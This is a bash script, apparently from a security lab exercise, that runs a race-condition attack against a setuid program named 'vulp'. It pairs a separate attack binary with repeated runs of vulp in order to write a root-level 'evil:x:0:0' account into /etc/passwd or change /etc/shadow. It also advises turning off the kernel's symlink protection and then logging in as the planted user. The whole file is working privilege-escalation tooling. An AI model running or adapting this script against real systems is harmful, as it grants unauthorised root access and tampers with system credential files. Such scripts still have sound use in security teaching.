#!/bin/bash

PASSWD_FILE="/etc/passwd"
SHADOW_FILE="/etc/shadow"

echo "=== Race Condition Attack (Parametrizable) ==="
echo

if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Don't run as root!"
    exit 1
fi

if [ ! -u "vulp" ]; then
    echo "ERROR: vulp needs setuid bit"
    echo "Run: sudo chown root:root vulp && sudo chmod u+s vulp"
    exit 1
fi

if [ "$SYMLINK_PROTECTION" = "1" ]; then
    echo "WARNING: protected_symlinks is enabled"
    echo "Consider running: sudo sysctl -w fs.protected_symlinks=0"
    echo "Continue anyway? (y/n)"
    read -n 1 answer
    echo
    if [ "$answer" != "y" ]; then
        exit 1
    fi
fi

run_vulp() {
    local input_file=$1
    local count=0
    while [ $count -lt 100000 ]; do
        ./vulp < "$input_file" >/dev/null 2>&1
        sleep 0.01
        count=$((count + 1))
    done
}

wait_for_change() {
    local file=$1
    local old_mtime=$(stat -c %Y "$file")
    echo "[+] Monitoring $file for changes..."
    while [ "$old_mtime" = "$(stat -c %Y $file)" ]; do
        sleep 1
    done
    echo "[SUCCESS] $file fue modificado."
}

# Modo /etc/passwd
if [ "$1" = "-p" ]; then
    echo "[+] Ejecutando ataque a $PASSWD_FILE..."
    ./attack "$PASSWD_FILE" &
    ATTACK_PID=$!

    run_vulp evil_input.txt &
    VULP_PID=$!

    wait $ATTACK_PID

    kill $VULP_PID 2>/dev/null

    echo
    if tail -5 "$PASSWD_FILE" | grep -q "evil:x:0:0"; then
        echo "[✓] ¡Ataque exitoso! Entrada maliciosa detectada en $PASSWD_FILE"
        tail -5 "$PASSWD_FILE" | grep "evil"
        echo "Ahora puedes intentar: su evil"
    else
        echo "[✗] Ataque finalizó pero no se logró insertar entrada. Puedes volver a intentarlo."
    fi

# Modo /etc/shadow
elif [ "$1" = "-s" ]; then
    echo "[+] Ejecutando ataque a $SHADOW_FILE..."
    ./attack "$SHADOW_FILE" &
    ATTACK_PID=$!

    run_vulp evil_input_shadow.txt &
    VULP_PID=$!

    wait_for_change "$SHADOW_FILE"

    kill $ATTACK_PID $VULP_PID 2>/dev/null
    echo "[✓] Ataque a $SHADOW_FILE completado. Intenta: su evil (contraseña: 123)"

else
    echo "Uso: $0 -p  # Ataque a $PASSWD_FILE"
    echo "       $0 -s  # Ataque a $SHADOW_FILE"
    exit 1
fi
